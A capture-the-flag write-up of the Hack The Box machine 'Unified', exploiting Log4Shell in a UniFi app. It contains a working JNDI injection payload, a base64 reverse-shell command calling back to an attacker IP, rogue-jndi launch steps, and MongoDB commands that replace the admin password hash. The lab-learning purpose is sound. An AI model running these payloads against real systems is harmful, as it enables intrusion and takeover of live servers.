# HTB Machine: Unified (Easy, Linux, Log4Shell / Log4j)

**Skills demonstrated:** Log4Shell (CVE-2021-44228) exploitation, JNDI/LDAP internals, MongoDB
credential extraction, privilege escalation via password hash replacement.

## Summary

Unified runs Ubiquiti's UniFi Network Application (v6.4.54), which is vulnerable to Log4Shell.
The `remember` field on the login form is logged via a vulnerable Log4j instance, allowing a JNDI
injection payload to trigger a callback to an attacker-controlled LDAP server. Using
[rogue-jndi](https://github.com/veracode-research/rogue-jndi), this callback can be weaponized
into a reverse shell. Once on the box, MongoDB (running locally, unauthenticated on
`127.0.0.1:27117`) exposes the admin user's password hash, which can be overwritten with a
known hash to gain admin panel access — from which the plaintext root SSH password is visible in
the UniFi SSH Authentication settings.

## Enumeration

```bash
nmap -sC -sV -Pn <target_ip>
```

Key ports: `8443` (UniFi HTTPS portal), confirming the version (`6.4.54`) via the login page,
which is a known-vulnerable version for CVE-2021-44228.

## Exploitation walkthrough (including what went wrong)

I want to document the actual debugging process here, since most of the real learning happened
in the mistakes, not the final working command.

### Setting up rogue-jndi

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

**Mistake #1 — corrupted base64 payload.** My first launch command accidentally had my
attacker IP glued onto the end of the base64 string:

```
{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuNTkvMTMzNyAwPiYxCg==10.10.15.59}
```

The `10.10.15.59` after the `==` padding broke the base64 entirely. Even if the LDAP callback
had fired successfully, the payload the target would have executed was garbage. Lesson: always
sanity-check generated payloads before firing them, e.g. `echo "<payload>" | base64 -d` locally
first to confirm it decodes to what you expect.

**Mistake #2 — wrong `--hostname` flag.** I initially launched rogue-jndi with a local/NAT
interface IP (`192.168.11.50`) instead of my actual VPN (`tun0`) IP. Since `--hostname` controls
what address rogue-jndi tells the target to fetch the secondary payload from (for the
Tomcat/Groovy gadget), a wrong value here breaks the second-stage HTTP callback even if the
initial LDAP lookup succeeds.

**Corrected launch command:**

```bash
java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,<valid_base64_here>}|{base64,-d}|{bash,-i}" \
  --hostname "<your_tun0_ip>"
```

### Sending the payload

Captured the login POST request in Burp Suite, then modified the `remember` field:

```json
{"username":"a","password":"a","remember":"${jndi:ldap://<attacker_ip>:1389/o=tomcat}","strict":true}
```

**Debugging tip that mattered:** when nothing showed up on the listener, running
`sudo tcpdump -i tun0 port 1389` confirmed whether the target was even attempting the callback at
all. Zero packets = the injection point isn't being logged (wrong field/vector); packets present
but connection failing = a rogue-jndi config issue. This distinction saved a lot of wasted time
chasing the wrong problem.

### Getting the shell

Once the payload and listener were correctly aligned on matching ports, the reverse shell landed:

```bash
nc -nlvp 1337
```

Stabilized with:

```bash
script /dev/null -c bash
```

## Privilege Escalation

MongoDB was found running locally and unauthenticated:

```bash
ps aux | grep mongo
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

The `x_shadow` field contains the admin's password hash, which can't be cracked directly — but it
*can* be overwritten with a hash of a password we know:

```bash
mkpasswd -m sha-512 <newpassword>
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<id>")},{$set:{"x_shadow":"<new_hash>"}})'
```

From there, logging into the UniFi admin panel with the new password reveals the SSH root
password in plaintext under Settings → Site → SSH Authentication.

## Key takeaways

- Always validate generated payloads (base64, encoded commands) locally before sending them —
  copy-paste errors are the most common cause of "it should be working" failures.
- `tcpdump` is the fastest way to distinguish "wrong injection point" from "right injection point,
  broken listener config."
- Storing credentials in a database that's reachable without auth (even on localhost) is a
  systemic pattern worth flagging in real engagements — not just a CTF quirk.
